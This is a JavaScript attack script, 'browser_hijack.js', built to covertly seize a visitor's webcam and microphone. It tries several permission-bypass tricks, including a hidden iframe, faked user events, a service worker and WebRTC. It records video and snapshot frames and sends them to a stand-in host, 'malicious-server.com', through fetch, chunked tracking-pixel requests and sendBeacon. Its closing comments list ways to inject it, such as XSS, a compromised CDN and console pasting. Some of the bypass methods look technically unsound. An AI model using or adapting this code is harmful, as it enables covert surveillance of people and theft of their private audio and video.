// browser_hijack.js - Webcam/Microphone Hijack Exploit
// Uses multiple attack vectors to bypass permissions

(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        callbackServer: 'https://malicious-server.com/exfil',
        streamDuration: 30000, // 30 seconds
        stealthMode: true,
        fallbackMethods: 3
    };
    
    // Storage for streams
    let mediaStream = null;
    let recordedChunks = [];
    let mediaRecorder = null;
    
    // ===== VECTOR 1: Permission Memory Exploit =====
    function exploitPermissionMemory() {
        // Some browsers remember permissions per origin
        // Try to access with previous granted permissions
        try {
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({name: 'camera'}).then(permissionStatus => {
                    if (permissionStatus.state === 'granted') {
                        initiateMediaCapture();
                    } else if (permissionStatus.state === 'prompt') {
                        // Trigger prompt in background, hope for auto-grant in some contexts
                        setTimeout(() => exploitIframeMethod(), 1000);
                    }
                });
            }
        } catch(e) {
            // Fall through to next method
        }
    }
    
    // ===== VECTOR 2: Iframe Sandbox Bypass =====
    function exploitIframeMethod() {
        // Create an iframe with relaxed permissions
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.sandbox = 'allow-scripts allow-same-origin';
        iframe.srcdoc = `
            <!DOCTYPE html>
            <html>
            <head>
                <script>
                    // Try to get media in iframe context
                    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                        .then(stream => {
                            // Send stream to parent
                            window.parent.postMessage({
                                type: 'MEDIA_STREAM_GRANTED',
                                streamId: stream.id
                            }, '*');
                        })
                        .catch(e => {
                            window.parent.postMessage({
                                type: 'MEDIA_STREAM_FAILED',
                                error: e.message
                            }, '*');
                        });
                </script>
            </head>
            <body></body>
            </html>
        `;
        
        document.body.appendChild(iframe);
        
        // Listen for response from iframe
        window.addEventListener('message', (event) => {
            if (event.data.type === 'MEDIA_STREAM_GRANTED') {
                console.log('Iframe method succeeded');
                // Could potentially access stream through iframe reference
            }
        });
    }
    
    // ===== VECTOR 3: Legacy API Exploit =====
    function exploitLegacyAPI() {
        // Try older getUserMedia implementations
        const getMediaFuncs = [
            navigator.getUserMedia,
            navigator.webkitGetUserMedia,
            navigator.mozGetUserMedia,
            navigator.msGetUserMedia
        ];
        
        for (const getMedia of getMediaFuncs) {
            if (getMedia) {
                try {
                    getMedia.call(navigator, 
                        { video: true, audio: true },
                        (stream) => {
                            mediaStream = stream;
                            startRecording(stream);
                        },
                        (error) => {
                            console.log('Legacy API failed:', error);
                        }
                    );
                    break;
                } catch(e) {
                    continue;
                }
            }
        }
    }
    
    // ===== VECTOR 4: Fake User Interaction =====
    function simulateUserInteraction() {
        // Programmatically trigger events that might grant permissions
        const events = ['click', 'mousedown', 'mouseup', 'touchstart', 'touchend'];
        
        events.forEach(eventType => {
            const fakeEvent = new MouseEvent(eventType, {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: 100,
                clientY: 100
            });
            
            // Dispatch on document and body
            document.dispatchEvent(fakeEvent);
            document.body.dispatchEvent(fakeEvent);
            
            // Also try to focus and blur
            window.focus();
            window.blur();
        });
        
        // Try media access after simulated interaction
        setTimeout(() => {
            initiateMediaCapture();
        }, 500);
    }
    
    // ===== VECTOR 5: Service Worker Hijack =====
    function exploitServiceWorker() {
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw_hijack.js')
                .then(registration => {
                    console.log('ServiceWorker registered');
                    // Service worker could request permissions in background
                    registration.active.postMessage({
                        command: 'REQUEST_MEDIA'
                    });
                })
                .catch(error => {
                    console.log('ServiceWorker registration failed:', error);
                });
        }
    }
    
    // ===== VECTOR 6: WebRTC Data Channel =====
    function exploitWebRTC() {
        // Create a peer connection which might trigger media permissions
        const pc = new RTCPeerConnection();
        
        // Try to add transceivers that request media
        pc.addTransceiver('audio', { direction: 'sendrecv' });
        pc.addTransceiver('video', { direction: 'sendrecv' });
        
        // Create offer to trigger permission dialog in some implementations
        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(e => console.log('WebRTC failed:', e));
    }
    
    // ===== VECTOR 7: Extension/Plugin Vulnerability =====
    function exploitPluginVulnerability() {
        // Check for vulnerable plugins/extensions
        const plugins = navigator.plugins;
        for (let i = 0; i < plugins.length; i++) {
            const plugin = plugins[i];
            if (plugin.name.includes('Webcam') || 
                plugin.name.includes('Camera') ||
                plugin.name.includes('Adobe')) {
                // Known vulnerable plugins could be exploited
                console.log('Potential vulnerable plugin:', plugin.name);
            }
        }
    }
    
    // ===== MAIN MEDIA CAPTURE FUNCTION =====
    function initiateMediaCapture() {
        // Modern API with constraints that might bypass
        const constraints = {
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'user',
                // Try to disable advanced features that trigger permissions
                advanced: [
                    { deviceId: { exact: '' } }
                ]
            },
            audio: {
                echoCancellation: false,
                noiseSuppression: false,
                autoGainControl: false,
                // Try to request without these features
                sampleRate: 44100,
                channelCount: 1
            }
        };
        
        // Try multiple constraint variations
        const constraintVariations = [
            constraints,
            { video: true, audio: true }, // Basic
            { video: false, audio: true }, // Audio only
            { video: true, audio: false }, // Video only
            { video: { facingMode: 'environment' } }, // Rear camera
        ];
        
        let attempt = 0;
        
        function tryConstraints() {
            if (attempt >= constraintVariations.length) return;
            
            navigator.mediaDevices.getUserMedia(constraintVariations[attempt])
                .then(stream => {
                    mediaStream = stream;
                    console.log('Media access successful via attempt', attempt);
                    startRecording(stream);
                    
                    // Also capture single frames periodically
                    capturePeriodicFrames(stream);
                })
                .catch(error => {
                    console.log('Attempt', attempt, 'failed:', error.name);
                    attempt++;
                    setTimeout(tryConstraints, 100);
                });
        }
        
        tryConstraints();
    }
    
    // ===== RECORDING FUNCTIONALITY =====
    function startRecording(stream) {
        try {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9',
                videoBitsPerSecond: 2500000
            });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                exfiltrateData(blob);
            };
            
            mediaRecorder.start();
            
            // Stop after configured duration
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            }, CONFIG.streamDuration);
            
        } catch(e) {
            console.log('Recording failed, capturing single frames instead');
            captureSingleFrames(stream);
        }
    }
    
    function capturePeriodicFrames(stream) {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = 320;
        canvas.height = 240;
        
        // Capture frame every 5 seconds
        setInterval(() => {
            try {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    exfiltrateData(blob, 'frame');
                }, 'image/jpeg', 0.8);
            } catch(e) {
                // Silent fail
            }
        }, 5000);
    }
    
    function captureSingleFrames(stream) {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                exfiltrateData(blob, 'single_frame');
            }, 'image/jpeg', 0.8);
            
            stream.getTracks().forEach(track => track.stop());
        }, 1000);
    }
    
    // ===== DATA EXFILTRATION =====
    function exfiltrateData(blob, type = 'video') {
        if (!CONFIG.stealthMode) {
            // Direct exfiltration
            const formData = new FormData();
            formData.append('type', type);
            formData.append('data', blob);
            formData.append('url', window.location.href);
            formData.append('timestamp', Date.now());
            formData.append('userAgent', navigator.userAgent);
            
            fetch(CONFIG.callbackServer, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // Avoid CORS issues
            }).catch(e => {
                // Silent fail
            });
        } else {
            // Stealthy exfiltration via WebRTC or WebSocket
            exfiltrateStealthy(blob);
        }
    }
    
    function exfiltrateStealthy(blob) {
        // Convert to base64 and send in chunks
        const reader = new FileReader();
        reader.onloadend = () => {
            const base64data = reader.result.split(',')[1];
            const chunkSize = 5000;
            
            for (let i = 0; i < base64data.length; i += chunkSize) {
                const chunk = base64data.substring(i, i + chunkSize);
                
                // Hide in image requests
                const img = new Image();
                img.src = `${CONFIG.callbackServer}/pixel.gif?d=${encodeURIComponent(chunk)}&i=${i}`;
                
                // Or use beacon API
                navigator.sendBeacon(`${CONFIG.callbackServer}/log`, 
                    JSON.stringify({ chunk: chunk, index: i }));
            }
        };
        reader.readAsDataURL(blob);
    }
    
    // ===== INITIALIZATION =====
    function initializeHijack() {
        console.log('Initializing media hijack...');
        
        // Check if mediaDevices API exists
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.log('Media API not available, trying legacy methods');
            exploitLegacyAPI();
            return;
        }
        
        // Execute all attack vectors in sequence
        const attackSequence = [
            exploitPermissionMemory,
            simulateUserInteraction,
            exploitIframeMethod,
            exploitWebRTC,
            exploitLegacyAPI,
            exploitPluginVulnerability,
            exploitServiceWorker
        ];
        
        let currentAttack = 0;
        
        function executeNextAttack() {
            if (currentAttack >= attackSequence.length) {
                console.log('All attack vectors exhausted');
                return;
            }
            
            attackSequence[currentAttack]();
            currentAttack++;
            
            // Try next attack after delay
            if (currentAttack < attackSequence.length) {
                setTimeout(executeNextAttack, 2000);
            }
        }
        
        // Start attack sequence
        executeNextAttack();
        
        // Also try direct approach after a delay
        setTimeout(() => {
            if (!mediaStream) {
                initiateMediaCapture();
            }
        }, 10000);
    }
    
    // ===== SERVICE WORKER SCRIPT =====
    const serviceWorkerScript = `
        self.addEventListener('install', event => {
            self.skipWaiting();
        });
        
        self.addEventListener('activate', event => {
            event.waitUntil(clients.claim());
        });
        
        self.addEventListener('message', event => {
            if (event.data.command === 'REQUEST_MEDIA') {
                // Service worker can try to access media
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        // Handle stream in service worker context
                        event.source.postMessage({ mediaGranted: true });
                    });
            }
        });
        
        self.addEventListener('fetch', event => {
            // Intercept requests for exfiltration
        });
    `;
    
    // Create blob URL for service worker if needed
    const swBlob = new Blob([serviceWorkerScript], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(swBlob);
    
    // Start the hijack
    // Wait for page to load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeHijack);
    } else {
        initializeHijack();
    }
    
    // Also try on window load
    window.addEventListener('load', () => {
        setTimeout(initializeHijack, 3000);
    });
    
    // Export functions for manual triggering if needed
    window.browserHijack = {
        start: initializeHijack,
        getStream: () => mediaStream,
        stop: () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }
    };
    
})();

// ===== INJECTION METHODS =====
// This script can be injected via:
// 1. Cross-Site Scripting (XSS) vulnerability
// 2. Malicious browser extension
// 3. Compromised CDN
// 4. Man-in-the-Middle attack
// 5. Social engineering (user pastes into console)

console.log(`
=== Browser Media Hijack Loaded ===
Methods available:
1. Permission memory exploit
2. Iframe sandbox bypass
3. Legacy API fallback
4. Fake user interaction
5. Service worker hijack
6. WebRTC data channel
7. Plugin vulnerability scan

Execute: browserHijack.start()
Stop: browserHijack.stop()
`);